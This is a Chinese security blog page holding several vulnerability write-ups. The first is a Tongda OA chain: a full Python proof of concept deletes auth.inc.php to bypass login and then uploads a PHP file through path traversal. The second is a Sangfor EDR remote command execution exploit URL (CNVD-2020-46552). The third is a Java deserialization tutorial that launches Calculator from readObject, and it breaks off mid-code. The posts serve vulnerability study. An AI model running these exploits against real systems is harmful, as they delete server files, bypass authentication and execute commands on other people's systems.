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">img</a></p>
<p>这里呢，简单来讲就是把auth.inc.php给包含进来，如果没有对应session的话，auth.inc.php就会作为“拦路虎”，让用户去登陆，但是删掉会怎么样？</p>
<p>这里就要看php里面include和require的区别了</p>
<p>这两个东西看起来很相似,都是包含嘛，但是稍稍学过洋文的都知道，include的意思指的是包含，而require却有要求的意思，在这里就可以看出点区别了。</p>
<p>如果要包含的文件找不着，include就索性跳过去了，而require是要求，感觉更加强烈一些，找不着文件就fatal error停止不前了。</p>
<p>而恰巧通达OA里面用的都是include，于是如果发现auth.inc.php失踪了，就会直接跳过去!</p>
<p>因此我们只需要利用前面的漏洞，删掉auth.inc.php，即可跳过通达OA里面大部分身份验证！</p>
<p>其中的代码验证SESSION判断是否登录</p>
<h1 id="变量覆盖和任意文件上传"><a href="#变量覆盖和任意文件上传" class="headerlink" title="变量覆盖和任意文件上传"></a>变量覆盖和任意文件上传</h1><p>这里我们看到general/data_center/utils/upload.php</p>
<p>这前面包含的header.inc.php会将$_REQUEST中的所有东西注册成变量</p>
<p>（没找到大佬说的位置）</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200909162931818-20200914140743298.png" alt="img"></p>
<p>可以尝试使用变量覆盖</p>
<p>漏洞点在图中最后一个else</p>
<p>$repkid可控，然后传参数时加入../../../跳到别的目录（因为通达OA的nginx配置中，上传文件所在的attachment目录里面的PHP不准访问，因此必须要跳出去）</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200909162931777-20200914140806788.png" alt="img"></p>
<p>POC如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本POC不是无损利用的，会让对方系统文件被删除导致无法正常工作并且由于目标系统及网络环境不可控，该漏洞也不可能编写出在任何情况下都完全无损的EXP使用时请一定一定要慎重，一定要获取对方书面授权再使用如果仅仅想要检测漏洞的存在性，可以自己编写脚本只检测&#x2F;module&#x2F;appbuilder&#x2F;assets&#x2F;print.php是否存在 import requeststarget&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:8203&#x2F;&quot;payload&#x3D;&quot;&lt;?php echo 123456 ?&gt;&quot;print(&quot;[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA&quot;)input(&quot;Press enter to continue&quot;)print(&quot;[*]Deleting auth.inc.php....&quot;) url&#x3D;target+&quot;&#x2F;module&#x2F;appbuilder&#x2F;assets&#x2F;print.php?guid&#x3D;..&#x2F;..&#x2F;..&#x2F;webroot&#x2F;inc&#x2F;auth.inc.php&quot;requests.get(url&#x3D;url)print(&quot;[*]Checking if file deleted...&quot;)url&#x3D;target+&quot;&#x2F;inc&#x2F;auth.inc.php&quot;page&#x3D;requests.get(url&#x3D;url).textif &#39;No input file specified.&#39; not in page:    print(&quot;[-]Failed to deleted auth.inc.php&quot;)    exit(-1)print(&quot;[+]Successfully deleted auth.inc.php!&quot;)print(&quot;[*]Uploading payload...&quot;)url&#x3D;target+&quot;&#x2F;general&#x2F;data_center&#x2F;utils&#x2F;upload.php?action&#x3D;upload&amp;filetype&#x3D;nmsl&amp;repkid&#x3D;&#x2F;.&lt;&gt;.&#x2F;.&lt;&gt;.&#x2F;.&lt;&gt;.&#x2F;&quot;files &#x3D; &#123;&#39;FILE1&#39;: (&#39;hack.php&#39;, payload)&#125;requests.post(url&#x3D;url,files&#x3D;files)url&#x3D;target+&quot;&#x2F;_hack.php&quot;page&#x3D;requests.get(url&#x3D;url).textif &#39;No input file specified.&#39; not in page:    print(&quot;[+]Filed Uploaded Successfully&quot;)    print(&quot;[+]URL:&quot;,url)else:    print(&quot;[-]Failed to upload file&quot;)</span><br></pre></td></tr></table></figure></div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/%E9%80%9A%E8%BE%BEOA/">通达OA </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/13/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8Dedr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-angle-double-right"></i>深信服edr远程命令执行cnvd-2020-46552漏洞分析</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-13</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:51:26.210Z" title="2020-12-23T08:51:26.210Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">3 minutes read (About 442 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/13/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8Dedr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">深信服edr远程命令执行cnvd-2020-46552漏洞分析</a></h1><div class="content"><h1 id="EDR简介"><a href="#EDR简介" class="headerlink" title="EDR简介"></a>EDR简介</h1><p>终端检测响应平台（EDR）是深信服公司提供的一套终端安全解决方案，方案由轻量级的端点安全软件（Agent）和管理平台（MGR）共同组成。</p>
<p>漏洞复现：</p>
<h1 id="远程命令执行漏洞CNVD-2020-46552"><a href="#远程命令执行漏洞CNVD-2020-46552" class="headerlink" title="远程命令执行漏洞CNVD-2020-46552"></a>远程命令执行漏洞CNVD-2020-46552</h1><p><a target="_blank" rel="noopener" href="https://xn--ip+-0y3e189o/tool/log/c.php?strip_slashes=system&host=id">https://ip+端口/tool/log/c.php?strip_slashes=system&amp;host=id</a></p>
<p><a target="_blank" rel="noopener" href="https://b0u4ne.github.io/2020/09/09/深信服edr漏洞分析/getImage-20200909154516622.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200909154516622.png" alt="img"></a></p>
<p><a target="_blank" rel="noopener" href="https://b0u4ne.github.io/2020/09/09/深信服edr漏洞分析/getImage-20200909154516622.png">img</a></p>
<p>漏洞分析：</p>
<p>将c.php中的文件进行分析</p>
<p><a target="_blank" rel="noopener" href="https://b0u4ne.github.io/2020/09/09/深信服edr漏洞分析/getImage-20200909154516609.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200909154516609.png" alt="img"></a></p>
<p><a target="_blank" rel="noopener" href="https://b0u4ne.github.io/2020/09/09/深信服edr漏洞分析/getImage-20200909154516609.png">img</a></p>
<p>$_REQUEST将传入的参数保存为数组，将前台的参数传入到$show_form</p>
<p>进入$show_form</p>
<p><a target="_blank" rel="noopener" href="https://b0u4ne.github.io/2020/09/09/深信服edr漏洞分析/getImage.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage.png" alt="img"></a></p>
<p><a target="_blank" rel="noopener" href="https://b0u4ne.github.io/2020/09/09/深信服edr漏洞分析/getImage.png">img</a></p>
<p>使用了匿名函数，use调用了外部变量$strip_slashes、$show_input</p>
<p>extract()函数会从数组中将变量导入到当前的符号表。他会把数组变成变量，函数使用数组的键名为变量名，键值为变量值</p>
<p>$host是如果存在就执行$strip_slashes($host)</p>
<p>那么传参数的时候使用:strip_slashes=system&amp;host=id</p>
<p><a target="_blank" rel="noopener" href="https://b0u4ne.github.io/2020/09/09/深信服edr漏洞分析/getImage-20200909154517340.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200909154517340.png" alt="img"></a></p>
<p><a target="_blank" rel="noopener" href="https://b0u4ne.github.io/2020/09/09/深信服edr漏洞分析/getImage-20200909154517340.png">img</a></p>
<p>strip_slashes函数的作用是去掉&amp;变量中的\</p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/sangfor/">sangfor, </a><a class="link-muted" rel="tag" href="/tags/EDR/">EDR </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/13/WEB/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%E4%B8%80-%E4%BB%8ESerializbale%E6%8E%A5%E5%8F%A3%E5%BC%80%E5%A7%8B%E5%85%88%E5%BC%B9%E4%B8%80%E4%B8%AA%E8%AE%A1%E7%AE%97%E5%99%A8/"><i class="fas fa-angle-double-right"></i>Java反序列化漏洞学习实践一-从Serializbale接口开始先弹一个计算器</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-13</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-29T11:35:23.109Z" title="2020-12-29T11:35:23.109Z">2020-12-29</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-29</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">10 minutes read (About 1437 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/13/WEB/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%E4%B8%80-%E4%BB%8ESerializbale%E6%8E%A5%E5%8F%A3%E5%BC%80%E5%A7%8B%E5%85%88%E5%BC%B9%E4%B8%80%E4%B8%AA%E8%AE%A1%E7%AE%97%E5%99%A8/">Java反序列化漏洞学习实践一-从Serializbale接口开始先弹一个计算器</a></h1><div class="content"><h3 id="0x0、基本概念"><a href="#0x0、基本概念" class="headerlink" title="0x0、基本概念"></a>0x0、基本概念</h3><p><strong>1、什么是序列化和反序列化</strong></p>
<p>Serialization（序列化）是指把Java对象保存为二进制字节码的过程；反序列化deserialization是把二进制码重新转换成Java对象的过程。</p>
<p><strong>2、什么情况下需要序列化</strong></p>
<p>a）当你想把的内存中的对象保存到一个文件中或者数据库中时候；</p>
<p>b）当你想用套接字在网络上传送对象的时候；</p>
<p>c）当你想通过RMI传输对象的时候；</p>
<p>总之，序列化的用途就是传递和存储。</p>
<p><strong>3、如何实现序列化</strong></p>
<p>将需要序列化的类实现Serializable接口就可以了，Serializable接口中没有任何方法，可以理解为一个标记，即表明这个类可以被序列化。</p>
<p>序列化与反序列化都可以理解为“写”和“读”操作 ，通过如下这两个方法可以将对象实例进行“序列化”与“反序列化”操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"></span><br><span class="line"> * 写入对象内容</span><br><span class="line"></span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">private void writeObject(java.io.ObjectOutputStream out)</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"></span><br><span class="line"> * 读取对象内容</span><br><span class="line"></span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">private void readObject(java.io.ObjectInputStream in)﻿</span><br></pre></td></tr></table></figure>

<p><strong>4、一些注意点</strong></p>
<p>当然，并不是一个实现了序列化接口的类的所有字段及属性，都是可以序列化的：</p>
<p>如果该类有父类，则分两种情况来考虑：</p>
<p>1.如果该父类已经实现了可序列化接口，则其父类的相应字段及属性的处理和该类相同；</p>
<p>2.如果该类的父类没有实现可序列化接口，则该类的父类所有的字段属性将不会序列化，并且反序列化时会调用父类的默认构造函数来初始化父类的属性，而子类却不调用默认构造函数，而是直接从流中恢复属性的值。</p>
<p>如果该类的某个属性标识为static类型的，则该属性不能序列化。</p>
<p>如果该类的某个属性采用transient关键字标识，则该属性不能序列化。</p>
<p>a）当一个父类实现序列化，子类自动实现序列化，不需要显式实现Serializable接口；</p>
<p>b）当一个对象的实例变量引用其他对象，序列化该对象时也把引用对象进行序列化；</p>
<h3 id="0x1、简单实例"><a href="#0x1、简单实例" class="headerlink" title="0x1、简单实例"></a>0x1、简单实例</h3><p>以下代码是一个简单的序列化和反序列化操作的demo。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">package 反序列化;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class deserTest implements Serializable &#123;	</span><br><span class="line">	&#x2F;&#x2F;创建一个简单的可被序列化的类，它的实例化后的对象就是可以被序列化的</span><br><span class="line">	private static final long serialVersionUID &#x3D; 1L;</span><br><span class="line">	private int n;</span><br><span class="line">	public deserTest(int n) &#123;</span><br><span class="line">		this.n&#x3D;n;</span><br><span class="line">	&#125;</span><br><span class="line">	@Override</span><br><span class="line">	public String toString() &#123;</span><br><span class="line">		return &quot;deserTest [n&#x3D;&quot; + n + &quot;, getClass()&#x3D;&quot; + getClass() + &quot;, hashCode()&#x3D;&quot; + hashCode() + &quot;, toString()&#x3D;&quot;</span><br><span class="line">				+ super.toString() + &quot;]&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">			deserTest x &#x3D; new deserTest(5);</span><br><span class="line">			operation.ser(x);</span><br><span class="line">			operation.deser();</span><br><span class="line">			x.toString();</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class operation&#123;</span><br><span class="line">	public static void ser(Object obj) &#123;</span><br><span class="line">		&#x2F;&#x2F;序列化操作，写操作</span><br><span class="line">		try &#123;</span><br><span class="line">			ObjectOutputStream ooStream &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;object.obj&quot;));</span><br><span class="line">			&#x2F;&#x2F;ObjectOutputStream能把Object输出成Byte流</span><br><span class="line">			ooStream.writeObject(obj);</span><br><span class="line">			ooStream.flush();</span><br><span class="line">			ooStream.close();</span><br><span class="line">			</span><br><span class="line">		&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;catch (IOException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public static void deser() &#123;</span><br><span class="line">		&#x2F;&#x2F;反序列化，读取操作</span><br><span class="line">		try &#123;</span><br><span class="line">			ObjectInputStream iiStream &#x3D; new ObjectInputStream(new FileInputStream(&quot;object.obj&quot;));</span><br><span class="line">			Object xObject &#x3D; iiStream.readObject();</span><br><span class="line">			System.out.println(xObject);</span><br><span class="line">			iiStream.close();</span><br><span class="line">		&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;catch (IOException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO Auto-generated catch block</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            &#x2F;&#x2F; TODO Auto-generated catch block</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;﻿</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200913014255836.png" alt="img"></p>
<h3 id="0x2、自定义反序列化的行为–弹个计算器"><a href="#0x2、自定义反序列化的行为–弹个计算器" class="headerlink" title="0x2、自定义反序列化的行为–弹个计算器"></a>0x2、自定义反序列化的行为–弹个计算器</h3><p>自定义序列化和反序列化过程，就是重写writeObject和readObject方法。</p>
<p>对以上代码进行改造，加入readObject方法的重写，再重写函数中加入自己的代码逻辑。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">package 反序列化;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class deserTest2 implements Serializable &#123;	</span><br><span class="line">	&#x2F;&#x2F;创建一个简单的可被序列化的类，它的实例化后的对象就是可以被序列化的</span><br><span class="line">	private static final long serialVersionUID &#x3D; 1L;</span><br><span class="line">	private int n;</span><br><span class="line">	public deserTest2(int n) &#123;</span><br><span class="line">		this.n&#x3D;n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	@Override</span><br><span class="line">	public String toString() &#123;</span><br><span class="line">		return &quot;deserTest2 [n&#x3D;&quot; + n + &quot;, getClass()&#x3D;&quot; + getClass() + &quot;, hashCode()&#x3D;&quot; + hashCode() + &quot;, toString()&#x3D;&quot;</span><br><span class="line">				+ super.toString() + &quot;]&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	private void readObject(java.io.ObjectInputStream in) throws IOException,ClassNotFoundException&#123;</span><br><span class="line">		in.defaultReadObject();</span><br><span class="line">		Runtime.getRuntime().exec(&quot;open &#x2F;System&#x2F;Applications&#x2F;Calculator.app&quot;);</span><br><span class="line">		System.out.println(&quot;test&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">			deserTest2 x &#x3D; new deserTest2(5);</span><br><span class="line">			operation1.ser(x);</span><br><span class="line">			operation1.deser();</span><br><span class="line">			